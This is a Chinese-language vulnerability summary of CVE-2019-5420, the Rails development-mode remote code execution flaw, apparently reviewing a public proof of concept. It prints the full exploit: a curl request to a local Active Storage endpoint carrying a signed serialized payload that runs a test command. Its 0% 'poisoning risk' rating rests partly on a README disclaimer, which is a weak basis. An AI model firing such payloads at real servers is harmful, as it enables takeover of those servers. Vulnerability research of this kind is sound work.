## CVE-2019-5420-Rails开发模式远程代码执行

**漏洞编号:** CVE-2019-5420

**漏洞类型:** 远程代码执行

**影响应用:** Rails

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <5.2.2.1, <6.0.0.beta3 (开发模式)

**利用条件:** Rails应用运行于开发模式，且目标服务器可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-5420是一个存在于Rails框架开发模式下的远程代码执行漏洞。攻击者可以通过猜测自动生成的开发模式密钥令牌，然后利用该令牌结合其他Rails内部机制，实现远程代码执行。漏洞影响Rails 5.2.2.1之前和6.0.0.beta3之前的版本。

**利用方式：**

1.  **猜测密钥：** 漏洞利用的关键在于猜测Rails应用在开发模式下自动生成的`secret_key_base`。由于生成算法的随机性不足，攻击者可以通过一些手段进行猜测。
2.  **构造恶意请求：** 成功获取`secret_key_base`后，攻击者可以构造一个包含恶意代码的请求，并使用该密钥对其进行签名。Rails应用在处理该请求时，会验证签名，如果验证通过，就会执行恶意代码。

**POC有效性：**

提供的Dockerfile、Gemfile等文件用于构建一个存在漏洞的Rails应用环境，方便漏洞验证。

提供的POC利用代码 `curl http://127.0.0.1:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d'/test` 看起来像是利用了Active Storage的某个功能点，结合猜测的密钥，最终触发命令执行。

根据提供的`README.md`，该POC执行`touch /tmp/rce`命令，如果执行成功，则表明漏洞利用成功。因此，该POC是有效的。

**投毒风险：**

查看提供的Dockerfile、Gemfile和LICENSE等文件，没有发现任何明显的恶意代码或后门。该漏洞本身是由于Rails开发模式下的安全配置不当造成的，POC代码只是利用了这一漏洞。`README.md` 提到 "For educational purposes only."，说明作者的意图是用于学习和研究，而不是恶意利用。因此，可以认为该代码存在投毒风险的概率很低，大约为0%。

**项目地址:** [knqyf263/CVE-2019-5420](https://github.com/knqyf263/CVE-2019-5420)

**漏洞详情:** [CVE-2019-5420](https://nvd.nist.gov/vuln/detail/CVE-2019-5420)